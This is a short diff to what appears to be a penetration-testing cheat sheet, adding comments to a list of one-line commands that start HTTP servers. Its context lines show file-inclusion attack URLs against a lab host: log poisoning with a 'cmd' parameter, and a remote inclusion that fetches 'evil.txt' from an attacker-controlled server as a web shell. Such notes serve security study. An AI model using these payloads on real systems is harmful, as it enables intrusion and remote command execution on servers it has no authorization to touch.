@@ -9,10 +9,10 @@ http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig    
 - call it from the vulnerable php
 http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig    # Web Shell
 
-# Start HTTP Server (Apache alternatives)
+# Start HTTP Server (Apache alternatives) // apache --> sudo service apache2 start /or/ sudo /etc/init.d/apache2 start /or/ sudo systemctl start apache2.service /or/ 
 python -m SimpleHTTPServer 7331
 python3 -m http.server 7331
 php -S 0.0.0.0:8000
-ruby -run -e httpd . -p 9000
+ruby -run -e httpd . -p 9000      # . for current directory
 busybox httpd -f -p 10000
 
